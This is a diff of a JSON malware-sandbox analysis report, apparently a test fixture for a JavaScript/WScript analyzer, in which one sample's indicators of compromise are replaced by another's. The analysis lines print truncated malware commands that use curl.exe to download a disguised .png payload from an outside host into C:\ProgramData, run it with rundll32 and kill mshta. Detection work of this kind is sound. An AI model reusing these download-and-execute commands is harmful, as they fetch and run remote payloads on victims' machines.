@@ -16,7 +16,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"139.99.117.17\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://139.99.117.17/68597.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/68597.dat\"}]",
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"somonoo.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://somonoo.com/6wb/i.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/6wb/i.gif\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 1,
@@ -33,14 +33,14 @@
         "tags": {
           "network": {
             "static": {
-              "ip": [
-                "139.99.117.17"
+              "domain": [
+                "somonoo.com"
               ],
               "uri": [
-                "http://139.99.117.17/68597.dat"
+                "https://somonoo.com/6wb/i.gif"
               ],
               "uri_path": [
-                "/68597.dat"
+                "/6wb/i.gif"
               ]
             }
           }
@@ -61,7 +61,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tActiveXObject(wscript.shell)\n\n\t\tActiveXObject(shell.application)\n\n\t\tvar WshShell = new ActiveXObject('WScript.Shell')",
+        "body": "JavaScript creates an ActiveXObject\n\t\tActiveXObject(WScript.Shell)\n\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tActiveXObject(wscript.shell)\n\n\t\tActiveXObject(shell.application)\n\n\t\tvar axqKhseWy = new ActiveXObject('WScript.Shell')",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -83,7 +83,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[15]\n\n\t\tnew WScript.Shell[17]\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[19]\n\n\t\tnew WScript.Shell[21]\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -105,7 +105,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[17].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
+        "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[21].Run(curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gif...\n\t\tWScript.Shell[21].Run(taskkill /f /im mshta.exe, 0, undefined)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -127,7 +127,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[17].Run(curl.exe --output C:\\ProgramData\\index1.png --url http://139.99.117.17/68597.d...",
+        "body": "JavaScript runs code via shell\n\t\tnew Function(url, function acTCJORy3(millis){var date = new Date();var curDate = null;do { curDate =...\n\t\tWScript.Shell[21].Run(curl.exe --output C:\\ProgramData\\aj0iG.png --url https://somonoo.com/6WB/i.gif...\n\t\tWScript.Shell[21].Run(taskkill /f /im mshta.exe, 0, undefined)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -149,7 +149,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell application\n\t\tShell.Application[18].ShellExecute(rundll32,C:\\ProgramData\\index1.png,Wind,,open,3)\n",
+        "body": "JavaScript runs code via shell application\n\t\tShell.Application[22].ShellExecute(rundll32,C:\\ProgramData\\aj0iG.png,Wind,,open,3)\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -171,7 +171,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"google.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://google.com\"}, {\"ioc_type\": \"ip\", \"ioc\": \"139.99.117.17\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://139.99.117.17/68597.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/68597.dat\"}]",
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"google.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://google.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"somonoo.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://somonoo.com/6wb/i.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/6wb/i.gif\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 0,
@@ -187,17 +187,15 @@
           "network": {
             "static": {
               "domain": [
-                "google.com"
-              ],
-              "ip": [
-                "139.99.117.17"
+                "google.com",
+                "somonoo.com"
               ],
               "uri": [
                 "https://google.com",
-                "http://139.99.117.17/68597.dat"
+                "https://somonoo.com/6wb/i.gif"
               ],
               "uri_path": [
-                "/68597.dat"
+                "/6wb/i.gif"
               ]
             }
           }
@@ -207,7 +205,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"ip\", \"ioc\": \"139.99.117.17\"}, {\"ioc_type\": \"uri\", \"ioc\": \"http://139.99.117.17/68597.dat\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/68597.dat\"}]",
+        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"somonoo.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://somonoo.com/6wb/i.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/6wb/i.gif\"}]",
         "body_format": "TABLE",
         "classification": "TLP:W",
         "depth": 0,
@@ -224,14 +222,14 @@
         "tags": {
           "network": {
             "dynamic": {
-              "ip": [
-                "139.99.117.17"
+              "domain": [
+                "somonoo.com"
               ],
               "uri": [
-                "http://139.99.117.17/68597.dat"
+                "https://somonoo.com/6wb/i.gif"
               ],
               "uri_path": [
-                "/68597.dat"
+                "/6wb/i.gif"
               ]
             }
           }
@@ -241,7 +239,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "\t\tAn encoded literal was found: 084a8a9aa8cced9175bd07bc44998e75",
+        "body": "\t\tAn encoded literal was found: 685bfde03eb646c27ed565881917c71c",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 0,
@@ -257,7 +255,7 @@
           "file": {
             "string": {
               "extracted": [
-                "084a8a9aa8cced9175bd07bc44998e75"
+                "685bfde03eb646c27ed565881917c71c"
               ]
             }
           }
@@ -271,13 +269,13 @@
     "extracted": [
       {
         "name": "extracted_wscript.bat",
-        "sha256": "4bfafbb9be2fecdbcc1210afd08223e8da7b9e0baaf2fd472a077e4697f885ac"
+        "sha256": "d67387f19c24a35e72a527c528bc9125f249e67347163ea20b1c352a460541cd"
       }
     ],
     "supplementary": [
       {
         "name": "temp_javascript.js",
-        "sha256": "d4b2a1f86f01fe67553747925196d9a154fe20ca63e921268056079b0b950850"
+        "sha256": "1aefa20d68b3cfecd4a4817b83aab7bb3f25ff4683d5e6dc113998b3d304549c"
       }
     ]
   },
@@ -348,16 +346,16 @@
         {
           "heur_id": 2,
           "signatures": [],
-          "value": "084a8a9aa8cced9175bd07bc44998e75"
+          "value": "685bfde03eb646c27ed565881917c71c"
         }
       ],
-      "network.dynamic.ip": [
+      "network.dynamic.domain": [
         {
           "heur_id": 13,
           "signatures": [
             "wscript_curl_url"
           ],
-          "value": "139.99.117.17"
+          "value": "somonoo.com"
         }
       ],
       "network.dynamic.uri": [
@@ -366,7 +364,7 @@
           "signatures": [
             "wscript_curl_url"
           ],
-          "value": "http://139.99.117.17/68597.dat"
+          "value": "https://somonoo.com/6wb/i.gif"
         }
       ],
       "network.dynamic.uri_path": [
@@ -375,7 +373,7 @@
           "signatures": [
             "wscript_curl_url"
           ],
-          "value": "/68597.dat"
+          "value": "/6wb/i.gif"
         }
       ],
       "network.static.domain": [
@@ -383,39 +381,37 @@
           "heur_id": 2,
           "signatures": [],
           "value": "google.com"
-        }
-      ],
-      "network.static.ip": [
+        },
         {
           "heur_id": 12,
           "signatures": [
             "suspicious_url_found"
           ],
-          "value": "139.99.117.17"
+          "value": "somonoo.com"
         },
         {
           "heur_id": 2,
           "signatures": [],
-          "value": "139.99.117.17"
+          "value": "somonoo.com"
         }
       ],
       "network.static.uri": [
         {
+          "heur_id": 2,
+          "signatures": [],
+          "value": "https://google.com"
+        },
+        {
           "heur_id": 12,
           "signatures": [
             "suspicious_url_found"
           ],
-          "value": "http://139.99.117.17/68597.dat"
+          "value": "https://somonoo.com/6wb/i.gif"
         },
         {
           "heur_id": 2,
           "signatures": [],
-          "value": "http://139.99.117.17/68597.dat"
-        },
-        {
-          "heur_id": 2,
-          "signatures": [],
-          "value": "https://google.com"
+          "value": "https://somonoo.com/6wb/i.gif"
         }
       ],
       "network.static.uri_path": [
@@ -424,12 +420,12 @@
           "signatures": [
             "suspicious_url_found"
           ],
-          "value": "/68597.dat"
+          "value": "/6wb/i.gif"
         },
         {
           "heur_id": 2,
           "signatures": [],
-          "value": "/68597.dat"
+          "value": "/6wb/i.gif"
         }
       ]
     },
